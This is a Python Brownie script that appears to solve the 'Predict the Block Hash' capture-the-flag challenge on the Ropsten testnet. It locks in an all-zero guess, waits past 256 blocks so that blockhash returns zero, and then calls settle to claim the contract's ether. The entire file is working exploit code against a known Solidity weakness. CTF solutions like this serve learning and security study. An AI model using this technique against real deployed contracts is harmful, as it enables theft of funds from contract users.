from brownie import accounts, PredictTheBlockHashChallenge
from web3 import Web3
import time

eth_amount = Web3.toWei("1", "ether")
account = accounts.load("Ropsten_test_net_account")
challenge_address = "0x9477FA7972D94a0446De44A26928F6a7EC1F15Fe"
guess = "0x0000000000000000000000000000000000000000000000000000000000000000"


def attack():
    # get contract
    challenge = PredictTheBlockHashChallenge.at(challenge_address)
    print(f"You have a balance of: {account.balance()}")
    print(f"The contract has a balance of: {challenge.balance()}")
    # lock in guess of 0
    start_tx = challenge.lockInGuess(
        guess, {"from": account, "value": eth_amount, "gas_limit": 1e6}
    )
    start_tx.wait(1)
    print(start_tx.info())
    print(f"You have a balance of: {account.balance()}")
    print(f"The contract has a balance of: {challenge.balance()}")
    # wait 256 blocks: blockhash will return 0
    while start_tx.confirmations < 258:
        print(start_tx.confirmations)
        time.sleep(15)
    print("256 blocks have been added. Starting exploit...")
    # call settle after 256 blocks
    tx = challenge.settle({"from": account, "gas_limit": 1e6})
    tx.wait(1)
    # confirm that we have completed the challenge
    print(f"Challenge has been completed: {challenge.isComplete()}")


def main():
    attack()
